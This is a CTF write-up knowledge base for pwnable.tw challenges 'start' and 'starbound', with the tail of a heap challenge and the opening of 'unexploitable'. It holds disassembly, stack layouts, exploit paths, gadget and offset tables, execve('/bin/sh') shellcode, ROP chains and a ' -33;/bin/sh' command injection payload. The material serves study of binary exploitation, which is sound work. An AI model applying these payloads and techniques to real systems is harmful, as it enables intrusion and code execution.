
#### Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
_IO_2_1_stdout_ = 0x1b0d60
system          = 0x3a940
bin_sh          = 0x158e8b
# one_gadgets (from one_gadget tool):
one_gadgets     = [0x3a819, 0x3a81c, 0x5f065, 0x5f066]
```

#### Solution Write-ups

| File | Key Technique | Notes |
|------|---------------|-------|
| `1006.md` | sprintf overflow → House of Spirit → one_gadget | Leaks stack via reason overflow; GOT read for libc |
| `1172.md` | sprintf overflow → fake chunk → system("/bin/sh") | Clean code; single-iteration leak |
| `1269.md` | sprintf overflow → House of Spirit → one_gadget | Detailed helper functions; two-phase leak |
| `1297.md` | sprintf overflow → fake chunk → system+exit+binsh | Full ret2libc with clean exit |
| `1303.md` | sprintf overflow → fake chunk → system | Messy parsing but works; raw hex leak |
| `1316.md` | sprintf overflow → House of Spirit → system+exit+binsh | Clean exploit with proper recv handling |
| `1351.md` | sprintf overflow → fake chunk → system | Uses ntpwn library |
| `1384.md` | sprintf overflow → fake chunk → system | Minimal; uses fflush offset for libc leak |
| `1689.md` | sprintf overflow → fake chunk → system | Uses reason at various offsets for two-stage leak |
| `1727.md` | sprintf overflow → House of Spirit → one_gadget (0x5f065) | Verbose but well-structured |
| `1803.md` | sprintf overflow → fake chunk → system | Written in Ruby |
| `1913.md` | sprintf overflow → ROP chain (read→puts→system) | Multi-stage ROP; leaks libc via puts(GOT) at runtime |
| `10128.md` | sprintf overflow → fake chunk → system | Uses regex for leak parsing |
| `10840.md` | sprintf overflow → fake chunk → system | Detailed with proper fastbin next-size validation |
| `11445.md` | sprintf overflow → fake chunk → system | Short; anchors libc on `_IO_file_sync` offset |
| `11540.md` | sprintf overflow → fake chunk → system | Uses `interactive()` trick for scanf buffering |
| `13019.md` | sprintf overflow → House of Spirit → system | Detailed step-by-step with raw_input pauses |
| `14032.md` | sprintf overflow → fake chunk → system | Different libc version offsets (2.27 locally) |
| `14605.md` | sprintf overflow → fake chunk → system | Clean helper functions |
| `17048.md` | sprintf overflow → House of Spirit → system | Detailed telnetlib-based; places "/bin/sh" on stack |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (socket-based, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/spirited_away` | Challenge binary (i386, stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, 32-bit) |
| `solution/*.md` | Community write-ups (129 solutions) |

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

No separate exploit-path section was present in the source record.

### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Key Technique | Notes |
|------|---------------|-------|
| `1006.md` | sprintf overflow → House of Spirit → one_gadget | Leaks stack via reason overflow; GOT read for libc |
| `1172.md` | sprintf overflow → fake chunk → system("/bin/sh") | Clean code; single-iteration leak |
| `1269.md` | sprintf overflow → House of Spirit → one_gadget | Detailed helper functions; two-phase leak |
| `1297.md` | sprintf overflow → fake chunk → system+exit+binsh | Full ret2libc with clean exit |
| `1303.md` | sprintf overflow → fake chunk → system | Messy parsing but works; raw hex leak |
| `1316.md` | sprintf overflow → House of Spirit → system+exit+binsh | Clean exploit with proper recv handling |
| `1351.md` | sprintf overflow → fake chunk → system | Uses ntpwn library |
| `1384.md` | sprintf overflow → fake chunk → system | Minimal; uses fflush offset for libc leak |
| `1689.md` | sprintf overflow → fake chunk → system | Uses reason at various offsets for two-stage leak |
| `1727.md` | sprintf overflow → House of Spirit → one_gadget (0x5f065) | Verbose but well-structured |
| `1803.md` | sprintf overflow → fake chunk → system | Written in Ruby |
| `1913.md` | sprintf overflow → ROP chain (read→puts→system) | Multi-stage ROP; leaks libc via puts(GOT) at runtime |
| `10128.md` | sprintf overflow → fake chunk → system | Uses regex for leak parsing |
| `10840.md` | sprintf overflow → fake chunk → system | Detailed with proper fastbin next-size validation |
| `11445.md` | sprintf overflow → fake chunk → system | Short; anchors libc on `_IO_file_sync` offset |
| `11540.md` | sprintf overflow → fake chunk → system | Uses `interactive()` trick for scanf buffering |
| `13019.md` | sprintf overflow → House of Spirit → system | Detailed step-by-step with raw_input pauses |
| `14032.md` | sprintf overflow → fake chunk → system | Different libc version offsets (2.27 locally) |
| `14605.md` | sprintf overflow → fake chunk → system | Clean helper functions |
| `17048.md` | sprintf overflow → House of Spirit → system | Detailed telnetlib-based; places "/bin/sh" on stack |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (socket-based, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/spirited_away` | Challenge binary (i386, stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, 32-bit) |
| `solution/*.md` | Community write-ups (129 solutions) |


## start
> **Canonical route:** Return-address overwrite → `write` gadget leaks ESP, then shellcode executes
> **Read this case when:** A tiny pushed string receives 60 bytes with no NX or PIE.
> **Primary defect:** Return-address overwrite
> **Exploit primitive/result:** `write` gadget leaks ESP, then shellcode executes
> **Search terms:** start; 20-byte buffer; ESP leak; shellcode; no NX; syscall gadget
> **Version/protection clue:** Case target `start` — i386, static, no RELRO, NX disabled, no canary/PIE
> **Variant boundary:** Standalone; minimal stack shellcode case requiring no libc leak.

### Metadata

```yaml
tags:
  - stack-buffer-overflow
  - information-leak
  - shellcode
platform: pwnable.tw
points: 100
arch: i386
libc: static
relro: no
canary: no
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow in a minimal 32-bit assembly binary is used to leak the stack pointer via sys_write and return to user shellcode on the stack."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10000`
>
> Flag: `FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`

Source title: Start — pwnable.tw (100 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/start/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A tiny hand-written x86-32 assembly program (67 bytes of `.text`). It prints `"Let's start the CTF:"`, reads up to 60 bytes from stdin into a 20-byte stack buffer, then returns. No libc, no protections — pure raw syscalls on a statically linked, non-stripped ELF.

```text
checksec:
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled          # stack is RWX
  PIE:      No PIE
```

#### Disassembly

The entire binary is just two routines:

```asm
08048060 <_start>:
 8048060:  push   esp                    ; save original ESP on stack
 8048061:  push   0x804809d              ; push address of _exit (return addr)
 8048066:  xor    eax,eax                ; clear registers
 8048068:  xor    ebx,ebx
 804806a:  xor    ecx,ecx
 804806c:  xor    edx,edx
 804806e:  push   0x3a465443             ; push "CTF:" (5 pushes = 20 bytes)
 8048073:  push   0x20656874             ; push "the "
 8048078:  push   0x20747261             ; push "art "
 804807d:  push   0x74732073             ; push "s st"
 8048082:  push   0x2774654c             ; push "Let'"
 8048087:  mov    ecx,esp                ; ecx = buffer addr (ESP)
 8048089:  mov    dl,0x14                ; edx = 20 (count)
 804808b:  mov    bl,0x1                 ; ebx = 1 (stdout)
 804808d:  mov    al,0x4                 ; eax = 4 (sys_write)
 804808f:  int    0x80                   ; write(1, esp, 20) → prints message
 8048091:  xor    ebx,ebx               ; ebx = 0 (stdin)
 8048093:  mov    dl,0x3c                ; edx = 60 (count)
 8048095:  mov    al,0x3                 ; eax = 3 (sys_read)
 8048097:  int    0x80                   ; read(0, esp, 60) ← VULN: 60 > 20
 8048099:  add    esp,0x14               ; pop the 20-byte message buffer
 804809c:  ret                           ; return to [esp] (was _exit, now attacker-controlled)

0804809d <_exit>:
 804809d:  pop    esp                    ; restore original ESP
 804809e:  xor    eax,eax
 80480a0:  inc    eax                    ; eax = 1 (sys_exit)
 80480a1:  int    0x80                   ; exit(0)
```

##### Stack Layout at `read` (0x8048097)

```text
         ESP →  [ "Let'" ]           ← message[0:4]   (overwritten by input)
         +0x04  [ "s st" ]           ← message[4:8]
         +0x08  [ "art " ]           ← message[8:12]
         +0x0c  [ "the " ]           ← message[12:16]
         +0x10  [ "CTF:" ]           ← message[16:20]
         +0x14  [ 0x0804809d ]       ← saved return addr (_exit) ← OVERWRITE TARGET
         +0x18  [ original ESP ]     ← pushed by `push esp` at 0x8048060
         +0x1c  [ argc ]             ← original stack from kernel
         ...    (more argv/envp)     ← up to 60-20=40 bytes past ret addr
```

#### Vulnerability

##### V1 — Stack Buffer Overflow (20 bytes buffer, 60 bytes read)

**Root Cause:** `read(0, esp, 60)` reads 60 bytes into a region where only 20 bytes are allocated for the message. The remaining 40 bytes overflow past the message into the **saved return address** and beyond.

```asm
8048093:  mov    dl,0x3c         ; read up to 60 bytes
8048095:  mov    al,0x3          ; sys_read
8048097:  int    0x80            ; read(stdin, esp, 60)
8048099:  add    esp,0x14        ; skip 20-byte message
804809c:  ret                    ; return to whatever is now at [esp]
```

**Attacker controls:** bytes 20-23 overwrite the return address. Bytes 24-59 land on the stack after the return address.

**Enabling conditions:**
- **NX disabled** → stack is executable, shellcode runs directly
- **ASLR enabled** → stack addresses are randomized, need a leak
- **No canary** → return address overwrite is trivial
- **`push esp` at program start** → the original ESP value is stored on the stack at offset `+0x18`, just 4 bytes after the return address

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All 339 solutions use essentially the same two-stage approach. Variations are minor (different return gadget, shellcode flavor, NOP sled size).

---

##### Path A — Return to `0x8048087` → Leak Stack → Shellcode (Standard)

**Used by:** ~95% of all solutions (e.g., 100, 114, 1045, 1172, 1220, 1251, 1269, 1297, 1335, 10068, 10115, 10295, 10302, 11543, 12138, 12649, 13367, 13484, 14370, 15989, exp.py)

This is the canonical solution. Two interactions with the server:

**Stage 1 — Leak the stack address:**

```python
payload1 = b"A" * 20 + p32(0x08048087)
```

Overwrite the return address with `0x08048087` (`mov ecx, esp`). When `ret` executes at `0x804809c`:
1. `add esp, 0x14` pops the 20-byte message → ESP now points to the overwritten return address slot.
2. `ret` jumps to `0x08048087`.
3. At `0x08048087`: `mov ecx, esp` → ECX = current ESP.
4. `write(1, esp, 20)` prints 20 bytes from the stack. The **first 4 bytes** are the **original ESP** value (pushed by `push esp` at `0x8048060`).
5. `read(0, esp, 60)` gives us a second input opportunity.

```python
leaked_esp = u32(recv(4))  # original ESP from the stack
```

**Stage 2 — Jump to shellcode:**

```python
shellcode_addr = leaked_esp + 0x14  # shellcode lands 20 bytes after ESP
payload2 = b"A" * 20 + p32(shellcode_addr) + shellcode
```

The 20-byte padding fills the message buffer, `p32(shellcode_addr)` overwrites the return address, and the shellcode follows immediately after. When `ret` fires, execution jumps to the shellcode on the stack.

**Shellcode:** Almost universally `execve("/bin/sh", NULL, NULL)` — typically 21-28 bytes, many variants exist:

```asm
; 24-byte execve("/bin/sh") — most common variant
xor    eax, eax
push   eax
push   0x68732f2f    ; "//sh"
push   0x6e69622f    ; "/bin"
mov    ebx, esp      ; ebx = "/bin//sh"
xor    ecx, ecx
mov    edx, ecx      ; ecx = edx = NULL
mov    al, 0xb       ; sys_execve
int    0x80
```

---

##### Path B — Return to `0x0804808b` → Leak Stack (Shifted) → Shellcode-Before-Return

**Used by:** Solutions 138 (Ruby), 170

Returns to `0x804808b` instead of `0x8048087`. The difference: entering at `0x804808b` skips `mov ecx, esp` and `mov dl, 0x14`, so **ECX retains its prior value** (still points to the message area) and **BL is set to 1** but **DL keeps its old value** (0x14 from the previous write). This writes 20 bytes but from a different stack position — the leaked ESP value appears at a different offset in the output (byte 24 instead of byte 0).

```python
payload1 = b"a" * 20 + p32(0x0804808b)
# ... recv 24 bytes, then 4 bytes = leaked ESP
```

In stage 2, the shellcode is placed **before** the return address (in the 20-byte padding area), and the return address points backward:

```python
payload2 = shellcode.ljust(44, b"a") + p32(leaked_stack - 0x1c)
```

---

##### Path C — Return to `0x08048060` (`_start`) → Re-run → Standard Leak

**Used by:** Solution 10128

A three-stage variant: first overflow returns to `_start` (0x8048060) to completely re-run the program. The second run then uses the standard Path A approach. This adds one round trip but the logic is conceptually cleaner.

```python
# Stage 1: restart the program
payload1 = cyclic(20) + p32(0x8048060)
# Stage 2: leak (same as Path A stage 1)
payload2 = cyclic(20) + p32(0x8048087)
# Stage 3: shellcode (same as Path A stage 2)
payload3 = cyclic(20) + p32(leaked_esp + 20) + shellcode
```

---

##### Path D — NOP Sled Variants

**Used by:** Solutions 1220, 11540, 12138, 12649, 1236

Same two-stage approach as Path A, but use NOP sleds (`\x90`) before the shellcode to increase reliability:

```python
payload2 = b"\x90" * 20 + p32(leaked_esp + 20) + b"\x90" * N + shellcode
```

Some place the return address in multiple slots (e.g., `p32(addr) * 6`) to increase the chance of hitting the right offset.

---

##### Path E — Shellcode Placement Variations

A few solutions place shellcode in the 20-byte padding area (before the return address) instead of after it:

```python
# Shellcode in padding, return address points to it
payload2 = shellcode.ljust(20, b"\x90") + p32(leaked_esp - offset)
```

This works when the shellcode is small enough (≤20 bytes) and requires calculating the correct backward offset from the leaked stack address.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Return address overwrite | V1: 60-byte read into 20-byte buffer | Deterministic |
| Stack address leak | Return to `0x8048087` (write gadget) | Deterministic |
| Shellcode execution | NX disabled, stack is RWX | Deterministic |
| `execve("/bin/sh")` | 21-28 byte inline shellcode | Deterministic |

#### Key Addresses

```python
_start         = 0x08048060  # program entry
write_gadget   = 0x08048087  # mov ecx,esp; write(1,esp,20); read(0,esp,60)
write_no_ecx   = 0x0804808b  # mov bl,1; write(1,ecx,20); read(0,esp,60)
read_syscall   = 0x08048091  # xor ebx; read(0,esp,60)
add_esp_ret    = 0x08048099  # add esp,0x14; ret
_exit          = 0x0804809d  # pop esp; exit(1)
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

339 solutions exist, nearly all following Path A. Representative samples:

| File | Approach | Language | Notes |
|------|----------|----------|-------|
| `exp.py` | A | Python (raw sockets) | Reference exploit, no pwntools |
| `100.md` | A | Python (pwntools) | Minimal, clean |
| `114.md` | A | Python (pwntools) | Good prose explanation |
| `138.md` | B (Ruby) | Ruby | Returns to `0x804808b`; rare Ruby solution |
| `170.md` | B | Python (pwntools) | Returns to `0x804808b`, shellcode before ret addr |
| `1045.md` | A | Python (pwntools) | Uses `shellcraft.execve` |
| `1316.md` | A | Go | Only Go-language solution |
| `10128.md` | C | Python (pwntools) | Three-stage via `_start` re-entry |
| `10178.md` | E | Python (pwntools) | Shellcode before return address |
| `10295.md` | A | Python (pwntools) | Detailed stack diagram explanation |
| `11543.md` | A | Python (pwntools) | Korean; concise |
| `13889.md` | A | Python (raw sockets) | Most detailed writeup with annotated disassembly |
| `14370.md` | A | Python (raw sockets) | Good educational walkthrough |
| `15989.md` | A | Python (pwntools) | Clean and brief |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (raw sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/start` | Original challenge binary (ELF 32-bit, statically linked) |
| `solution/*.md` | Community write-ups (339 solutions) |


## starbound
> **Canonical route:** Signed-index OOB call → Function/data call, stack pivot, format leak, GOT/system, or syscall ROP
> **Read this case when:** A game command table accepts a signed negative index such as `-33`.
> **Primary defect:** Signed-index OOB call
> **Exploit primitive/result:** Function/data call, stack pivot, format leak, GOT/system, or syscall ROP
> **Search terms:** Starbound; command table; negative index; `cmds[-33]`; stack pivot; semicolon
> **Version/protection clue:** Case target `starbound` — i386, glibc 2.23, Partial RELRO, NX, no canary/PIE
> **Variant boundary:** Standalone; the semicolon/menu-state trick is route-specific.

### Metadata

```yaml
tags:
  - integer-overflow
  - stack-pivoting
  - rop
platform: pwnable.tw
points: 200
arch: i386
libc: glibc-2.23
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A negative index in the menu jump table allows reading outside the table, triggering stack pivoting onto user input to execute a ROP chain."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10202`
>
> Flag: `FLAG{st4r_st4r_st4r_b0und}`

Source title: Starbound — pwnable.tw (200 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/starbound/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A "Starbound" space-themed game binary (i386, No PIE, Partial RELRO, NX, No Canary) built against glibc 2.23. The player interacts through a numbered main menu (1–7) offering actions like exploring, fighting, inventory, map viewing, settings, and multiplayer. The settings menu allows changing the player's name and IP address. The main dispatcher uses `strtol` to parse the menu choice and indexes into a **function pointer table** with **no bounds check**.

```text
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

#### Key Memory Layout (No PIE — fixed addresses)

| Address | Content |
|---------|---------|
| `0x08057F80` | `me` struct (global player state) |
| `0x080580C8` | `me.ip` — IP address buffer |
| `0x080580D0` | `me.name` — player name buffer (4+ bytes) |
| `0x08058154` | Function pointer table (`cmds[]`) — 7 entries for menu options 1–7 |
| `0x0805509C` | `puts@GOT` |
| `0x08055050` | `__libc_start_main@GOT` |
| `0x08055054` | `read@GOT` |

The function pointer table at `0x08058154` lives at the **tail** of the `me` struct. The player name buffer at `0x080580D0` is at offset `-0x84` (i.e., -33 dwords) from the table base.

#### Vulnerabilities

##### V1 — Function Pointer Table Index OOB (Primary, Exploitable)

**Root Cause:** The main-menu dispatcher reads the user's choice via `strtol()` and uses it as an index into a function pointer table with **no bounds check**:

```asm
; main dispatch (0x0804A65D)
call    strtol          ; eax = user choice (signed)
call    DWORD PTR [eax*4 + 0x8058154]  ; NO bounds check on eax
```

Since `eax` can be **any signed integer** (including negative), the attacker can make the program call **any 4-byte-aligned dword in memory** as a function pointer.

**Key Index:** Index **-33** makes the dispatch read from `0x08058154 + (-33)*4 = 0x080580D0` — which is the **player name buffer**. Since the name is set by the user via the settings menu, this gives a call to an **attacker-controlled address**.

```text
cmds[-33] = *(0x080580D0) = name[0:4]
```

**Impact:** Arbitrary code execution — the first 4 bytes of the player's name are called as a function pointer.

##### V2 — Stack Leak via Large Negative Index (Exploitable)

**Root Cause:** Using a large negative index (e.g., `-3118`) points the function table lookup into the stack region. Since the input buffer is also on the stack, the resulting output from `puts` or the menu system can leak **stack addresses**.

```python
# -3118 index leaks a stack pointer through puts output
io.send("-3118")
stack_leak = u32(io.recv(4))
```

**Impact:** Leaks stack addresses, enabling precise stack pivoting or ROP chain placement.

##### V3 — Format String via `do_bye` Gadget (Exploitable)

**Root Cause:** Setting the name to point at a mid-function address `0x08049C16` inside `do_bye()` causes the dispatch to land at:

```asm
; 0x08049C16 (inside do_bye)
mov     [esp], 1
call    __printf_chk    ; __printf_chk(1, input_buffer)
```

This turns the **user's input buffer** into a format string argument to `__printf_chk`.

**Impact:** A fully controlled, **returning** format string. By embedding a return address (e.g., `MAIN_LOOP = 0x0804A664`) in the input buffer and using `%s` with an embedded GOT pointer, the attacker gets an arbitrary read that cleanly returns to the main loop.

##### V4 — Name Buffer Overflow into Settings Struct (Enabler)

The name read function (`readn`) reads up to a fixed number of bytes. The name buffer at `0x080580D0` sits within the larger `me` struct. Writing past the name can overwrite other struct fields, though the primary use is simply placing the 4-byte function pointer.

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions exploit V1 (function pointer table OOB) by setting the player name to a controlled value, then entering index `-33` (or a computed negative index) to call it. They diverge on the pivot/leak/shell strategy.

---

##### Path A — Stack Pivot → ROP → Leak libc → `system("/bin/sh")`

**Used by:** Solutions 100, 184, 1172, 1290, 1297, 1303, 1316, 1351, 1395, 14605, 18331, and many others

**The dominant approach (~80% of solutions).**

1. **Set name** to a stack-pivot gadget (e.g., `add esp, 0x1c; ret` at `0x08048e48` or `add esp, 0x10; pop; pop; pop; ret` at `0x0804a171`).

2. **Send `-33` + padding + ROP chain** as the menu input. When the dispatcher calls `name[0:4]`, the pivot adjusts `esp` to point into the attacker-controlled input buffer, landing in the ROP chain.

3. **ROP chain stage 1 — leak libc:**
   ```python
   # Typical ROP: puts(GOT_entry) → return to main
   rop = p32(puts_plt) + p32(main) + p32(puts_got)
   ```
   Leaks a resolved libc address (usually `puts`, `read`, or `__libc_start_main`).

4. **ROP chain stage 2 — shell:**
   After re-entering main with the libc base known:
   ```python
   rop = p32(system) + p32(0xdeadbeef) + p32(binsh_addr)
   ```
   Calls `system("/bin/sh")`.

**Common stack pivot gadgets:**

| Address | Gadget | Effect |
|---------|--------|--------|
| `0x08048e48` | `add esp, 0x1c; ret` | Skip 7 dwords into input |
| `0x0804a171` | `add esp, 0x10; pop; pop; pop; ret` | Skip 7 dwords |
| `0x0804997E` | `add esp, 0x1c; ret` (alternate) | Skip 7 dwords |
| `0x080498e8` | `add esp, 0x88; pop; pop; ret` | Large skip |
| `0x0804b36d` | `popal; ret` | Pop all registers from stack |
| `0x0804a5fe` | `add esp, 0x20; pop; pop; pop; ret` | Skip 8 dwords |

**Common ROP gadgets:**

| Address | Gadget |
|---------|--------|
| `0x08048939` | `pop ebx; ret` |
| `0x080499ef` | `pop esi; ret` |
| `0x080494da` | `pop ebx; pop esi; pop edi; ret` |
| `0x080491ba` | `pop ebx; pop esi; pop edi; pop ebp; ret` |
| `0x08048c58` | `leave; ret` |
| `0x080491bc` | `pop ebp; ret` |

---

##### Path B — Format String Leak → One-Gadget Shell

**Used by:** exp.py (the repository's exploit)

1. **Set name** = `p32(0x08049C16)` (mid-function `do_bye` gadget).

2. **Send format string payload as `-33` input:**
   ```python
   fmt = b"-33|" + p32(PUTS_GOT) + p32(MAIN_LOOP) + b"%p%p%p%p" + b"MARK" + b"%s"
   ```
   - `strtol("-33|...")` → index -33 → calls the `do_bye` gadget
   - The gadget calls `__printf_chk(1, input_buffer)` — a format string
   - `%p%p%p%p` burns varargs 1–4, then `%s` dereferences `PUTS_GOT` → **libc leak**
   - `MAIN_LOOP` at input[8] serves as the return address for the gadget's `add esp; ret`

3. **Set name** = `p32(libc_base + one_gadget)`.

4. **Send `-33` with NUL-filled input** → calls `one_gadget` → shell.

**Advantage:** No multi-stage ROP needed, simpler payload. **Constraint:** Requires `[esp+0x2c]==NULL` for the one-gadget.

---

##### Path C — Open/Read/Write Flag (No libc Needed)

**Used by:** Solutions 138, 174, 185, 1727, 16991

1. **Set name** = pivot gadget + `"/home/starbound/flag\0"`.

2. **ROP chain** uses only binary PLT stubs (no libc):
   ```python
   rop  = p32(open_plt)  + p32(pppr) + p32(flag_str_addr) + p32(0) + p32(0)
   rop += p32(read_plt)  + p32(pppr) + p32(3) + p32(bss_buf) + p32(0x100)
   rop += p32(write_plt) + p32(pppr) + p32(1) + p32(bss_buf) + p32(0x100)
   ```
   Opens the flag file, reads its contents to BSS, writes them to stdout.

**Advantage:** Deterministic — no libc leak needed, no ASLR dependency. Works on first try.

---

##### Path D — Stack Pointer Leak → Computed Index → Direct Call

**Used by:** Solutions 1763, 18324, 10840

1. **Leak a stack address** by using a large negative index (e.g., `-3118` or the `puts@GOT` index) that causes output containing stack data.

2. **Compute the exact index** so the dispatch table lookup points into the **attacker's input on the stack**, which contains the target function address.

3. **Call directly** into the stack-placed payload (e.g., `system` address placed in the input).

**Variant (18324):** Leaks both stack and libc by sending oversized inputs with index `-10`. Then computes an index pointing into the input buffer itself, where `system` is placed, and appends `;/bin/sh\0` to the input (since the input doubles as both the `strtol` argument and the `system` argument).

---

##### Path E — GOT Overwrite → `strtol` → `system`

**Used by:** Solution 1316

1. **Leak libc** via ROP (puts GOT entry).
2. **Use `read` to overwrite `strtol@GOT`** with `system`.
3. **Send `/bin/sh\0`** as the next menu input → `strtol("/bin/sh")` becomes `system("/bin/sh")`.

---

##### Path F — Syscall ROP (No libc, No `system`)

**Used by:** Solution 1324

1. **Leak `read` address** from GOT. Compute `int 0x80` syscall gadget at `read + 0x1c`.
2. **Use `xchg eax, ebx` / `xchg eax, ecx` / `xchg eax, edx` gadgets** to set registers for `execve("/bin/sh", NULL, NULL)` (syscall number 11).
3. **Set name** to pivot + `"/bin/sh\0"`.
4. **Overwrite `exit@GOT`** with the `int 0x80` address via `read`, then call `exit@PLT` → triggers `execve`.

**Advantage:** Works without knowing libc version at all.

---

##### Path G — `system(" -33;/bin/sh")` (Minimal)

**Used by:** Solution 18324 (easier variant)

1. **Set name** = `p32(puts_plt)`, index `-33` → leaks libc via `puts(input_buffer)`.
2. **Set name** = `p32(system)`.
3. **Send ` -33;/bin/sh\0`** — `strtol` parses `-33` (with leading space), dispatches to `system`, and `system` receives the full string ` -33;/bin/sh` which executes `/bin/sh` after the semicolon.

**Advantage:** Extremely elegant — the same input string serves as both the dispatch trigger AND the shell command.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Arbitrary function call | V1: name[0:4] via index -33 | Deterministic |
| Stack pivot into input | V1 + gadget in name | Deterministic |
| libc leak via puts/write ROP | Stack pivot + GOT read | Deterministic |
| libc leak via format string | V3: `do_bye` mid-function gadget | Deterministic |
| Stack address leak | V2: large negative index | Deterministic |
| ORW flag read (no libc) | ROP using only PLT stubs | Deterministic |
| Code execution | `system`/one-gadget/`execve` syscall | Deterministic |

#### Offsets (Remote libc: Ubuntu GLIBC 2.23-0ubuntu10, i386)

```python
puts              = 0x5fca0
__libc_start_main = 0x18540
system            = 0x3ada0
read              = 0xd5980
"/bin/sh"         = 0x15b82b
one_gadget        = 0x3ac5e   # execve("/bin/sh", esp+0x2c, environ)
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `100.md` | A | Stack pivot → `puts` leak → `read` GOT overwrite → `system` | Two-stage ROP |
| `138.md` | C | Stack pivot → ORW flag read | Ruby; no libc needed |
| `174.md` | C | `add esp, 0x1c` pivot → open/read/write flag | Minimal, clean |
| `184.md` | A | `add esp, 0x28` pivot → leak `__libc_start_main` → `system` | Stack pivot to BSS via `leave;ret` |
| `185.md` | C | `popal;ret` pivot → open/read/write flag | Uses `popal` gadget |
| `1006.md` | A | Stack pivot → `puts` leak → re-enter main → `system` | Two-stage, sets `/bin/bash` in name |
| `1172.md` | A | `add esp, 0x1c` → `puts` leak → GOT overwrite `strtol` → `system` | |
| `1290.md` | A | `puts` leak → `read` GOT overwrite → `puts("/bin/sh")` as system | |
| `1297.md` | A | Uses `pop esi;ret` → `call esi` gadget chain | Unique calling convention approach |
| `1303.md` | E | `puts` leak → `read` overwrites `strtol@GOT` → `system` | GOT overwrite |
| `1316.md` | E | DynELF to resolve `system` → GOT overwrite | Most complex; uses DynELF |
| `1324.md` | F | Leak `read` → compute `int 0x80` → `execve` syscall ROP | No libc version needed |
| `1351.md` | A | `puts` leak → stack pivot to BSS via `leave;ret` → `system` | |
| `1395.md` | A | `write` leak → two-stage ROP → `system("/bin/sh")` | |
| `1727.md` | C | `add esp, 0x1c` pivot → ORW flag | Explicit flag path string in name |
| `1763.md` | D | Leak stack via `-3118` index → compute index → `system` | Stack address brute |
| `1803.md` | A | Ruby; `add esp, 0x88` pivot → `puts` leak → `system` | |
| `10840.md` | D | Leak stack → compute index into input → `system` | |
| `13019.md` | A | `add esp, 0x1c` pivot → `puts` leak → syscall `execve` | Uses `xchg` gadgets for registers |
| `14605.md` | A | `add esp, 0x1c` pivot → `puts` leak → `system` | Clean two-stage |
| `16991.md` | C | `popal;ret` → open/read/write flag | No libc needed |
| `17704.md` | A | ret2libc (tried ret2dlresolve first) | |
| `18324.md` | D+G | Leak stack+libc via `-10` → `system(" -33;/bin/sh")` | Elegant semicolon trick |
| `18331.md` | A | LibcSearcher → `puts` leak → `system` | |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (Path B: format string leak → one-gadget) |
| `desc.txt` | Challenge description |
| `artifacts/starbound` | Original challenge binary (i386, stripped) |
| `solution/*.md` | Community write-ups (120 solutions) |


## unexploitable
> **Canonical route:** RBP/RIP stack control with no output/syscall → Writable GOT low-byte adjacent syscall, SROP, ret2csu, or alternate chain
> **Read this case when:** A large read overflows a 16-byte frame but the binary has no output or syscall instruction.
> **Primary defect:** RBP/RIP stack control with no output/syscall
> **Exploit primitive/result:** Writable GOT low-byte adjacent syscall, SROP, ret2csu, or alternate chain
> **Search terms:** unexploitable; no output; no syscall; GOT low byte; SROP; ret2csu
> **Version/protection clue:** Case target `unexploitable` — x86-64, glibc 2.23, Partial RELRO, NX, no canary/PIE
> **Variant boundary:** Standalone; use the adjacent-syscall trick rather than seeking a normal leak.

### Metadata

```yaml
tags:
  - stack-buffer-overflow
  - srop
  - stack-pivoting
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.23
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow without output functions is weaponized via Sigreturn-Oriented Programming (SROP) to set register states and invoke execve."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10403`
>
> Flag: `FLAG{4_r34lLy_Un3Xpl01T48l3_S3Rv1C3_Sh0UlD_n0T_H4v3_SYsC4ll_1NS1D3}`

Source title: unexploitable — pwnable.tw (500 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/unexploitable/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

